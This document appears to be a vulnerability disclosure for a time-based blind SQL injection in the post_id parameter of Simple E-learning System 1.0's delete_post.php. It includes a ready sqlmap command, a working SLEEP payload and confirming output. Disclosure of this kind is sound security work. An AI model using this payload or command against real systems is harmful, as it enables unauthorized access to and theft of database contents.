# SQL Injection in Simple E-learning System (Delete Post)

## Overview

* **Vulnerability Type**: SQL Injection
* **Vendor**: SourceCodester
* **Product**: [Simple E-learning System](https://www.sourcecodester.com/php-simple-e-learning-system-source-code)
* **Version**: 1.0
* **Component**: Delete Post functionality (`/includes/form_handlers/delete_post.php`)
* **Vulnerable Parameter**: `post_id` (GET)

## Description

A Time-based Blind SQL Injection vulnerability exists in **Simple E-learning System v1.0**. The vulnerability is located in the `delete_post.php` file, which handles the deletion of posts within a class.

The application fails to properly sanitize user input supplied to the `post_id` parameter in a GET request before using it in a SQL query. This allows an authenticated attacker to inject malicious SQL commands. By observing the server's response time (e.g., using `SLEEP()` commands), an attacker can infer data from the database byte-by-byte, leading to unauthorized data exfiltration.

## Steps to Reproduce

1. **Setup**: Deploy the Simple E-learning System locally.
2. **Login**: Log in to the application using valid credentials (e.g., Email: `jforeman@mail.com`, Password: `jforeman123`).
3. **Capture Request**: Click the delete button for a post and intercept the request using a proxy tool (like Burp Suite). The vulnerable endpoint is `/includes/form_handlers/delete_post.php`.
4. **Exploit**: Run `sqlmap` against the target URL using the captured cookie and the vulnerable `post_id` parameter.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8081/includes/form_handlers/delete_post.php?post_id=3&classCode=class101_a" --batch -v 6 --risk=3 --cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**Time-Based Blind Payload:**

```sql
post_id=3'+(SELECT 0x786b7556 WHERE 3909=3909 AND (SELECT 8382 FROM (SELECT(SLEEP(5)))LgDJ))+'&classCode=class101_a

```

## Proof of Concept

The following output from `sqlmap` confirms that the `post_id` parameter is vulnerable to Time-based Blind SQL injection:

```text
Parameter: post_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: post_id=3'+(SELECT 0x786b7556 WHERE 3909=3909 AND (SELECT 8382 FROM (SELECT(SLEEP(5)))LgDJ))+'&classCode=class101_a
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

---
[INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.12

```
<img width="1022" height="155" alt="图片" src="https://github.com/user-attachments/assets/d25663b7-234b-493e-889e-ca66df3e879f" />

## Impact

This vulnerability allows an authenticated attacker to:

1. **Exfiltrate Data**: Retrieve sensitive information from the database (e.g., usernames, password hashes) by inferring data character by character.
2. **Database Enumeration**: Identify database structure, tables, and columns.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php-simple-e-learning-system-source-code)
